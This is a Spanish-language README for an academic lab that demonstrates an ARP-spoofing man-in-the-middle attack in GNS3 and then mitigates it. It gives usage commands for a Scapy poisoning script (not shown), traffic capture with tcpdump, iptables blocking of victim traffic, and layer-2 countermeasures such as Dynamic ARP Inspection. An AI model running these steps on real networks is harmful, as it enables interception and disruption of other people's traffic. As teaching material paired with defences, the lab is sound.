# ARP MitM Attack Lab

![Python](https://img.shields.io/badge/Python-3.x-blue)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-red)
![Lab](https://img.shields.io/badge/Environment-GNS3%20%7C%20IOSvL2-orange)
![Attack](https://img.shields.io/badge/Attack-ARP%20MitM-purple)
![Status](https://img.shields.io/badge/Use-Controlled%20Lab-yellow)
![Security](https://img.shields.io/badge/Topic-Network%20Security-darkgreen)

## Aviso de uso responsable

Este proyecto fue desarrollado únicamente con fines educativos, académicos y de laboratorio controlado.

El script debe ejecutarse solamente en redes propias, laboratorios autorizados o entornos virtuales como GNS3, EVE-NG o PNETLab. No debe utilizarse en redes públicas, empresariales o de terceros sin autorización explícita.

---

## Archivos del repositorio

| Archivo                                              | Descripción                                                                                                    |
| ---------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| [`arp-mitm.py`](./arp-mitm.py)                       | Script principal utilizado para ejecutar el ataque ARP MitM desde Kali Linux.                                  |
| [`mitigacion-arp-mitm.md`](./mitigacion-arp-mitm.md) | Documento técnico con la mitigación general contra ataques ARP MitM.                                           |
| [`README.md`](./README.md)                           | Documentación principal del laboratorio, uso del script, evidencia esperada y flujo recomendado para el video. |

---

## Descripción

Este laboratorio demuestra un ataque **Man-in-the-Middle mediante ARP Spoofing**, donde una máquina atacante en Kali Linux falsifica respuestas ARP para colocarse entre una víctima y su gateway.

ARP no valida la identidad real de los dispositivos en la red local. Por esa razón, un atacante puede enviar respuestas ARP falsas indicando que su dirección MAC corresponde a la IP del gateway o a la IP de la víctima. Cuando el ataque es exitoso, el tráfico entre la víctima y el router pasa por la máquina atacante.

Este repositorio incluye un script en Python que automatiza el envenenamiento ARP, activa el reenvío de paquetes en Kali y restaura las tablas ARP al finalizar.

---

## Base del direccionamiento IP

El direccionamiento IP del laboratorio fue definido tomando como base la matrícula:

```text
20250845
```

Separando la matrícula en octetos, se obtuvo la dirección base:

```text
20.25.8.45
```

A partir de esta dirección se creó la red del laboratorio:

```text
20.25.8.0/24
```

---

## Objetivo del laboratorio

Demostrar cómo un atacante conectado a la misma red local puede realizar un ataque ARP MitM para interceptar, observar o controlar el tráfico entre una víctima y su gateway.

---

## Objetivo del script

El script [`arp-mitm.py`](./arp-mitm.py) permite:

* Seleccionar la interfaz de red atacante.
* Seleccionar la IP de la víctima.
* Seleccionar la IP del gateway.
* Resolver automáticamente las direcciones MAC.
* Enviar respuestas ARP falsificadas de forma continua.
* Activar IP forwarding en Kali para mantener la comunicación.
* Restaurar las tablas ARP al detener el ataque.
* Demostrar control del tráfico mediante captura y bloqueo selectivo.

---

## Topología utilizada

```text
                   +----------------+
                   |      R-1       |
                   | 20.25.8.45     |
                   | Fa0/0          |
                   +-------+--------+
                           |
                           |
                    Gi0/0  |
                   +-------+--------+
                   |     SW-1       |
                   |   IOSvL2       |
                   +---+--------+---+
                       |        |
                 Gi0/1 |        | Gi0/2
                       |        |
              +--------+        +--------+
              |                          |
        +-----+-----+              +-----+-----+
        |   Kali    |              |  Víctima  |
        |20.25.8.46 |              |20.25.8.47 |
        +-----------+              +-----------+
```

---

## Direccionamiento IP del laboratorio

| Dispositivo | Rol      | Interfaz  |  Dirección IP | Descripción                   |
| ----------- | -------- | --------- | ------------: | ----------------------------- |
| R-1         | Gateway  | Fa0/0     | 20.25.8.45/24 | Router de la red              |
| SW-1        | Switch   | Gi0/0     |           N/A | Conexión hacia R-1            |
| SW-1        | Switch   | Gi0/1     |           N/A | Conexión hacia Kali           |
| SW-1        | Switch   | Gi0/2     |           N/A | Conexión hacia la víctima     |
| Kali        | Atacante | eth0/eth1 | 20.25.8.46/24 | Máquina que ejecuta el ataque |
| PC/VPC      | Víctima  | eth0      | 20.25.8.47/24 | Equipo atacado                |

---

## Configuración IP base del laboratorio

### Router R-1

```cisco
enable
configure terminal

interface fastEthernet0/0
ip address 20.25.8.45 255.255.255.0
no shutdown

end
write memory
```

Si el router usa `GigabitEthernet0/0`, se cambia la interfaz:

```cisco
interface gigabitEthernet0/0
ip address 20.25.8.45 255.255.255.0
no shutdown
```

### VPC víctima

```text
ip 20.25.8.47/24 20.25.8.45
```

### Kali atacante

Si la interfaz del laboratorio es `eth0`:

```bash
sudo ip addr flush dev eth0
sudo ip addr add 20.25.8.46/24 dev eth0
sudo ip link set eth0 up
sudo ip route replace default via 20.25.8.45
```

Si la interfaz del laboratorio es `eth1`, cambia `eth0` por `eth1`.

---

## Pruebas de conectividad

Desde VPC:

```text
ping 20.25.8.45
ping 20.25.8.46
```

Desde Kali:

```bash
ping -c 4 20.25.8.45
ping -c 4 20.25.8.47
```

---

## Requisitos

### Sistema atacante

* Kali Linux
* Python 3
* Scapy instalado
* Permisos de superusuario
* Conectividad directa de capa 2 con la víctima y el gateway

### Dispositivos de red

* Router Cisco o dispositivo gateway
* Switch IOSvL2, Ethernet switch o equivalente
* Víctima en la misma red local

---

## Verificar Scapy

Antes de ejecutar el script, validar que Scapy está disponible:

```bash
python3 -c "import scapy; print('Scapy instalado')"
```

Si Scapy no está instalado y Kali tiene internet:

```bash
sudo apt update
sudo apt install -y python3-scapy
```

---

## Instalación

Clonar el repositorio:

```bash
git clone https://github.com/iClexi/ARP-MITM-Attack.git
cd ARP-MITM-Attack
```

Dar permisos de ejecución:

```bash
chmod +x arp-mitm.py
```

Verificar sintaxis:

```bash
python3 -m py_compile arp-mitm.py
```

---

## Uso básico

Ejecutar el script:

```bash
sudo python3 arp-mitm.py
```

El script solicitará:

```text
Interfaz que usará el ataque
IP de la víctima
IP del gateway
```

Ejemplo para este laboratorio:

```text
Interfaz que usará el ataque: eth0
IP de la víctima: 20.25.8.47
IP del gateway: 20.25.8.45
```

---

## Uso directo por parámetros

También puede ejecutarse sin preguntas:

```bash
sudo python3 arp-mitm.py -i eth0 -t 20.25.8.47 -g 20.25.8.45
```

Ejecutar por tiempo definido:

```bash
sudo python3 arp-mitm.py -i eth0 -t 20.25.8.47 -g 20.25.8.45 --duration 60
```

Ejecutar sin restaurar ARP al finalizar:

```bash
sudo python3 arp-mitm.py -i eth0 -t 20.25.8.47 -g 20.25.8.45 --no-restore
```

Ejecutar sin activar IP forwarding:

```bash
sudo python3 arp-mitm.py -i eth0 -t 20.25.8.47 -g 20.25.8.45 --no-forward
```

---

## Parámetros disponibles

| Parámetro         | Descripción                                                       |   Valor por defecto |
| ----------------- | ----------------------------------------------------------------- | ------------------: |
| `-i`, `--iface`   | Interfaz atacante usada por Kali                                  | Pregunta al usuario |
| `-t`, `--target`  | IP de la víctima                                                  | Pregunta al usuario |
| `-g`, `--gateway` | IP del gateway                                                    | Pregunta al usuario |
| `--interval`      | Tiempo entre rondas de envenenamiento ARP                         |              `0.15` |
| `--burst`         | Cantidad de paquetes ARP enviados por ronda                       |                `10` |
| `--duration`      | Duración del ataque en segundos. Si es `0`, corre indefinidamente |                 `0` |
| `--restore-count` | Cantidad de paquetes usados para restaurar ARP                    |                `10` |
| `--no-restore`    | No restaura las tablas ARP al finalizar                           |         Desactivado |
| `--no-forward`    | No activa IP forwarding                                           |         Desactivado |
| `--yes`           | Inicia sin pedir confirmación adicional                           |         Desactivado |

---

## Funcionamiento técnico

El ataque se basa en enviar respuestas ARP falsificadas a dos objetivos: la víctima y el gateway.

### Envenenamiento hacia la víctima

El script le dice a la víctima:

```text
La IP del gateway pertenece a la MAC del atacante
```

Ejemplo:

```text
20.25.8.45 -> MAC de Kali
```

### Envenenamiento hacia el gateway

El script le dice al router:

```text
La IP de la víctima pertenece a la MAC del atacante
```

Ejemplo:

```text
20.25.8.47 -> MAC de Kali
```

Cuando ambos lados aceptan las respuestas falsas, Kali queda en medio de la comunicación.

---

## Evidencia esperada del ataque

### En la víctima

Antes del ataque, la víctima debe tener la MAC real del gateway.

Durante el ataque, el gateway aparece asociado a la MAC de Kali:

```text
MAC_DE_KALI  20.25.8.45
```

Esto demuestra que la víctima cree que el gateway es la máquina atacante.

---

### En el router

En R1:

```cisco
show arp
```

Resultado esperado:

```text
Internet  20.25.8.47    0   MAC_DE_KALI  ARPA   FastEthernet0/0
```

Esto demuestra que el router cree que la IP de la víctima pertenece a la MAC del atacante.

---

## Comandos de validación

### En Kali

Mostrar interfaces:

```bash
ip -br a
ip -br link
```

Mostrar la MAC de Kali:

```bash
ip -br link show eth0
```

Capturar tráfico ARP e ICMP:

```bash
sudo tcpdump -i eth0 -n -e "arp or icmp"
```

Capturar tráfico relacionado con la víctima:

```bash
sudo tcpdump -i eth0 -n -e "arp or icmp or host 20.25.8.47"
```

Guardar evidencia en archivo PCAP:

```bash
sudo tcpdump -i eth0 -n -w arp_mitm_demo.pcap "arp or icmp or host 20.25.8.47"
```

---

### En la víctima

Ver tabla ARP:

```text
show arp
```

Probar comunicación hacia el gateway:

```text
ping 20.25.8.45
```

Volver a revisar ARP:

```text
show arp
```

---

### En R1

Ver tabla ARP:

```cisco
show arp
```

---

## Demostración de control del tráfico

Además de mostrar que Kali está en medio, se puede demostrar control del tráfico bloqueando ICMP entre la víctima y el gateway.

### Bloquear ping de la víctima hacia el gateway

En Kali:

```bash
sudo iptables -I FORWARD 1 -s 20.25.8.47 -d 20.25.8.45 -p icmp -j DROP
```

En la víctima:

```text
ping 20.25.8.45
```

Resultado esperado:

```text
El ping deja de responder o presenta pérdida de paquetes
```

### Ver la regla aplicada

```bash
sudo iptables -L FORWARD -n -v --line-numbers
```

### Restaurar el tráfico

```bash
sudo iptables -D FORWARD -s 20.25.8.47 -d 20.25.8.45 -p icmp -j DROP
```

Luego probar nuevamente:

```text
ping 20.25.8.45
```

Resultado esperado:

```text
El ping vuelve a responder correctamente
```

---

## Mitigación

La mitigación recomendada consiste en aplicar controles de capa 2, principalmente:

* DHCP Snooping
* Dynamic ARP Inspection
* ARP ACL para equipos con IP estática

La documentación completa de mitigación está disponible aquí:

* [`mitigacion-arp-mitm.md`](./mitigacion-arp-mitm.md)

---

## Verificación de mitigación

Después de aplicar la mitigación, ejecutar nuevamente el script:

```bash
sudo python3 arp-mitm.py
```

Revisar en el switch:

```cisco
show ip arp inspection statistics
show ip dhcp snooping binding
show ip arp inspection
```

Resultado esperado:

* El switch bloquea paquetes ARP falsificados.
* La tabla ARP de la víctima no cambia hacia la MAC del atacante.
* El gateway no aprende la IP de la víctima con la MAC del atacante.
* El tráfico ICMP no puede ser controlado por Kali mediante MitM.

---

## Flujo recomendado para el video

1. Mostrar la topología en GNS3.
2. Mostrar nombre, matrícula, fecha y hora.
3. Mostrar la tabla ARP normal de la víctima.
4. Mostrar la tabla ARP normal del router.
5. Ejecutar el script desde Kali.
6. Seleccionar interfaz, víctima y gateway.
7. Mostrar que la víctima asocia el gateway con la MAC de Kali.
8. Mostrar que R1 asocia la víctima con la MAC de Kali.
9. Ejecutar `tcpdump` en Kali para mostrar tráfico pasando por el atacante.
10. Hacer ping desde la víctima hacia el gateway.
11. Bloquear ICMP con `iptables`.
12. Mostrar que el ping falla.
13. Quitar la regla de `iptables`.
14. Mostrar que el ping vuelve.
15. Detener el script.
16. Mostrar restauración de tablas ARP.
17. Aplicar contramedida documentada en [`mitigacion-arp-mitm.md`](./mitigacion-arp-mitm.md).
18. Repetir la prueba y confirmar mitigación.

---

## Troubleshooting

### No se resuelve la MAC de la víctima

Verificar conectividad:

```bash
ping -c 4 20.25.8.47
```

Verificar interfaz correcta:

```bash
ip -br a
```

---

### La víctima pierde conectividad completa

Confirmar que IP forwarding está activo:

```bash
cat /proc/sys/net/ipv4/ip_forward
```

Debe mostrar:

```text
1
```

Activarlo manualmente:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

### El ping no se bloquea con iptables

Verificar que el tráfico realmente esté pasando por Kali:

```bash
sudo tcpdump -i eth0 -n -e "icmp or arp"
```

Ver reglas activas:

```bash
sudo iptables -L FORWARD -n -v --line-numbers
```

---

### Restaurar manualmente si algo queda raro

En Kali:

```bash
sudo iptables -F FORWARD
```

En la víctima:

```text
clear arp
```

En R1:

```cisco
clear arp-cache
```

---

## Estructura recomendada del repositorio

```text
ARP-MITM-Attack/
├── README.md
├── arp-mitm.py
├── mitigacion-arp-mitm.md
├── captures/
│   ├── arp-before.png
│   ├── arp-during-victim.png
│   ├── arp-during-router.png
│   ├── tcpdump-mitm.png
│   ├── icmp-blocked.png
│   └── mitigation.png
├── docs/
│   └── technical-report.md
└── video/
    └── youtube-link.txt
```

---

## Evidencias recomendadas

| Evidencia               | Descripción                               |
| ----------------------- | ----------------------------------------- |
| `arp-before.png`        | Tabla ARP antes del ataque                |
| `arp-during-victim.png` | Víctima asociando gateway con MAC de Kali |
| `arp-during-router.png` | Router asociando víctima con MAC de Kali  |
| `tcpdump-mitm.png`      | Kali observando ARP o ICMP                |
| `icmp-blocked.png`      | Kali bloqueando tráfico ICMP              |
| `mitigation.png`        | DAI, DHCP Snooping o ARP ACL funcionando  |

---

## Topics sugeridos para GitHub

```text
arp
arp-spoofing
mitm
man-in-the-middle
kali-linux
python
scapy
gns3
iosvl2
network-security
cybersecurity
packet-crafting
lab
ethical-hacking
```

---

## Conclusión

Este laboratorio demuestra cómo ARP puede ser abusado en una red local para posicionar una máquina atacante entre una víctima y su gateway.

El ataque fue validado al observar que la víctima asoció la IP del gateway con la MAC del atacante y que el router asoció la IP de la víctima con la misma MAC atacante. Además, se demostró control del tráfico mediante captura con `tcpdump` y bloqueo selectivo de ICMP con `iptables`.

La mitigación recomendada consiste en aplicar controles de capa 2 como DHCP Snooping, Dynamic ARP Inspection y ARP ACLs para redes con IPs estáticas.

Para más detalles, revisar el documento de mitigación:

* [`mitigacion-arp-mitm.md`](./mitigacion-arp-mitm.md)

---

## Autor

**Michael Robles / iClexi**
Laboratorio de Seguridad de Redes
Proyecto académico de ataque y mitigación ARP MitM
